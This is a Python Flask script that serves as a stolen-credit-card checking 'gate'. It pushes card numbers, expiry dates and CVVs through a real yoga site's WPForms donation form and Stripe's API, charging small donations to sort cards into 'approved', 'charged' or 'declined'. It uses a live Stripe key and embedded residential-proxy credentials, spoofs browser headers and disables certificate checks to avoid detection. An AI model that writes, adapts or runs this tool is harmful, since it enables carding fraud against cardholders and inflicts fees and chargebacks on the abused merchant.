from flask import Flask, jsonify, request
import requests
import time
import uuid
import json
import random
import warnings
import ssl
import urllib3
from urllib.parse import unquote
from requests.adapters import HTTPAdapter

# ---------------- CONFIGURATION ----------------
# Disable SSL warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

STRIPE_KEY = "pk_live_51IMhSJLYE7drGyUglIxoBPOWZT671cE4T6AxGyrZcyuWEZruEI80R72arhmENIuIChp3pG8TiQw8HBcK29Vg093N00fsXVP4X3"
BASE_URL = "https://micheleyoga.com"
REFERER = "https://micheleyoga.com/donate-now/"
WPFORMS_TOKEN = "332cd919288e4e20999f1fcbdffcfb78"

# ---------------- PROXY CONFIGURATION ----------------
PROXY = "http://user-Mdw5TwO58ewqByFP-type-residential-session-mt140xgu-country-DE-city-Berlin-rotation-5:9GFLalL6ZKPZraFe@geo.g-w.info:10080"
proxies = {
    'http': PROXY,
    'https': PROXY
}

app = Flask(__name__)

# ---------------- CUSTOM SSL ADAPTER ----------------
class CustomSSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = context
        kwargs['cert_reqs'] = 'CERT_NONE'
        kwargs['assert_hostname'] = False
        return super(CustomSSLAdapter, self).init_poolmanager(*args, **kwargs)

# ---------------- HEADERS ----------------
base_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
}

stripe_headers = base_headers.copy()
stripe_headers.update({
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-fetch-site': 'same-site',
})

ajax_headers = base_headers.copy()
ajax_headers.update({
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'origin': 'https://micheleyoga.com',
    'referer': REFERER,
    'sec-fetch-site': 'same-origin',
    'x-requested-with': 'XMLHttpRequest',
})

# ---------------- HELPERS ----------------
def get_timestamp_ms():
    return str(int(time.time() * 1000))

def generate_random_id():
    return str(uuid.uuid4())

def get_session():
    session = requests.Session()
    session.trust_env = False
    session.proxies = proxies
    session.verify = False
    
    # Mount the Custom Adapter
    adapter = CustomSSLAdapter()
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    
    return session

def robust_post(session, url, **kwargs):
    """
    Attempts a POST request with Proxy.
    If it fails (Proxy/SSL/Connection error), retries without Proxy.
    """
    try:
        # Attempt 1: With Proxy
        return session.post(url, timeout=30, **kwargs)
    except (requests.exceptions.ProxyError, requests.exceptions.SSLError, 
            requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
        print(f"[!] Proxy failed ({e.__class__.__name__}). Retrying WITHOUT proxy...")
        # Attempt 2: Direct Connection (Override proxies to None)
        return session.post(url, timeout=30, proxies=None, **kwargs)

# ---------------- ROUTE ----------------
@app.route('/<path:path>')
def gateway(path):
    if not path.startswith('gate=stripe/cc='):
        return jsonify({"error": "Invalid endpoint format"}), 404

    try:
        # Extract and decode the card data
        cc_data_raw = path.split('=')[-1]
        cc_data = unquote(cc_data_raw)
        
        parts = cc_data.split('|')
        if len(parts) != 4:
            return jsonify({"status": "declined", "message": "Invalid input format", "decline_code": "input_error"}), 400
            
        cc_num, cc_mm, cc_yy, cc_cvv = [p.strip() for p in parts]
        
        masked_cc = f"{cc_num[:4]}********{cc_num[-4:]}"
        print(f"\n[NEW REQUEST] CC: {masked_cc}")

        session = get_session()

        # ---------------- STEP 1: CREATE PAYMENT METHOD ----------------
        print(">>> Step 1: Creating Payment Method...")

        fresh_ids = {
            'client_session_id': generate_random_id(),
            'elements_session_config_id': generate_random_id(),
            'guid': generate_random_id(),
            'muid': generate_random_id(),
            'sid': generate_random_id()
        }

        data_1 = {
            'type': 'card',
            'card[number]': cc_num,
            'card[cvc]': cc_cvv,
            'card[exp_year]': cc_yy,
            'card[exp_month]': cc_mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'billing_details[email]': 'dfghbgfd@gmail.com',
            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; payment-element; deferred-intent; autopm',
            'referrer': REFERER,
            'time_on_page': str(random.randint(20000, 60000)),
            'client_attribution_metadata[client_session_id]': fresh_ids['client_session_id'],
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
            'client_attribution_metadata[elements_session_config_id]': fresh_ids['elements_session_config_id'],
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'client_attribution_metadata[merchant_integration_additional_elements][1]': 'linkAuthentication',
            'guid': fresh_ids['guid'],
            'muid': fresh_ids['muid'],
            'sid': fresh_ids['sid'],
            'key': STRIPE_KEY
        }

        try:
            resp1 = robust_post(session, 'https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data_1)
            resp1_json = resp1.json()
            print(f"[LOG STEP 1] {json.dumps(resp1_json, indent=2)}")
            payment_method_id = resp1_json['id']
        except Exception as e:
            print(f"[ERROR STEP 1] {e}")
            return jsonify({"status": "declined", "message": "Payment Gateway Error", "decline_code": "connection_error"})

        # ---------------- STEP 2: SUBMIT FORM ----------------
        print("\n>>> Step 2: Processing Transaction...")

        start_time = get_timestamp_ms()
        time.sleep(0.5) 
        end_time = get_timestamp_ms()

        files_2 = {
            'wpforms[fields][4][first]': (None, 'sdfghj'),
            'wpforms[fields][4][last]': (None, 'sdfghj'),
            'wpforms[fields][1]': (None, '0.50'),
            'wpforms[id]': (None, '12203'),
            'page_title': (None, 'Donate Now'),
            'page_url': (None, REFERER),
            'page_id': (None, '12229'),
            'wpforms[post_id]': (None, '12229'),
            'vx_width': (None, '1160'),
            'vx_height': (None, '1201'),
            'vx_url': (None, REFERER),
            'wpforms[payment_method_id]': (None, payment_method_id),
            'wpforms[token]': (None, WPFORMS_TOKEN),
            'action': (None, 'wpforms_submit'),
            'start_timestamp': (None, start_time),
            'end_timestamp': (None, end_time),
        }

        try:
            resp2 = robust_post(session, f'{BASE_URL}/wp-admin/admin-ajax.php', headers=ajax_headers, files=files_2)
            resp2_json = resp2.json()
            print(f"[LOG STEP 2] {json.dumps(resp2_json, indent=2)}")
            client_secret = resp2_json['data']['payment_intent_client_secret']
            payment_intent_id = client_secret.split('_secret_')[0]
        except Exception as e:
            print(f"[ERROR STEP 2] {e}")
            return jsonify({"status": "declined", "message": "Payment Gateway Error", "decline_code": "connection_error"})

        # ---------------- STEP 3: CONFIRM PAYMENT ----------------
        print("\n>>> Step 3: Confirming Payment Intent...")

        data_3 = {
            'use_stripe_sdk': 'true',
            'mandate_data[customer_acceptance][type]': 'online',
            'mandate_data[customer_acceptance][online][infer_from_client]': 'true',
            'return_url': REFERER,
            'payment_method': payment_method_id,
            'key': STRIPE_KEY,
            'client_attribution_metadata[client_session_id]': fresh_ids['client_session_id'],
            'client_attribution_metadata[merchant_integration_source]': 'l1',
            'client_secret': client_secret,
        }

        try:
            resp3 = robust_post(
                session,
                f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm',
                headers=stripe_headers,
                data=data_3
            )
            resp3_json = resp3.json()
            print(f"[LOG STEP 3] {json.dumps(resp3_json, indent=2)}")
        except Exception as e:
            print(f"[ERROR STEP 3] {e}")
            return jsonify({"status": "declined", "message": "Payment Gateway Error", "decline_code": "connection_error"})

        # ---------------- FINAL RESULT LOGIC ----------------
        final_result = {
            "status": None,
            "message": None,
            "decline_code": None
        }

        try:
            if 'error' in resp3_json:
                error_data = resp3_json['error']
                decline_code = error_data.get('decline_code', 'unknown')
                message = error_data.get('message', 'Unknown error')
                
                if decline_code == 'insufficient_funds':
                    final_result['status'] = 'approved'
                else:
                    final_result['status'] = 'declined'
                    
                final_result['message'] = message
                final_result['decline_code'] = decline_code
                
            elif resp3_json.get('status') == 'succeeded':
                final_result['status'] = 'charged'
                final_result['message'] = 'Your card was charged.'
                final_result['decline_code'] = 'Succeeded'
            
            elif resp3_json.get('status') == 'requires_source_action':
                final_result['status'] = 'declined'
                final_result['decline_code'] = 'requires_source_action'
                final_result['message'] = 'We are unable to verify your payment method'
                
            else:
                final_result['status'] = 'declined'
                final_result['message'] = 'Transaction Failed'
                final_result['decline_code'] = 'processing_error'

        except Exception as e:
            print(f"[ERROR PARSING FINAL] {e}")
            final_result['status'] = 'declined'
            final_result['message'] = 'Payment Gateway Error'
            final_result['decline_code'] = 'system_error'

        return jsonify(final_result)

    except Exception as e:
        print(f"[SERVER ERROR] {e}")
        return jsonify({"status": "declined", "message": "Internal Server Error", "decline_code": "system_error"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
